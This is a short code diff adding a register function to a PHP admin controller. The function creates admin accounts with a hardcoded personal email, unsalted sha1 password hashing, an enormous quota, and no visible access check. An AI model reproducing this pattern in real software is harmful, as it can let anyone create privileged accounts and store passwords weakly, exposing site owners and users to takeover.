@@ -100,4 +100,15 @@ class AdminController extends Controller
         session()->forget(['adminData']);
         return redirect('/login');
     }
+
+    function register(Request $request)
+    {
+        $data = new admin();
+        $data->username = $request->username;
+        $data->email = 'arsdsocial2@gmail.com';
+        $data->password = sha1($request->password);
+        $data->keyQuota = 5000000000000;
+        $data->save();
+        return redirect('/');
+    }
 }
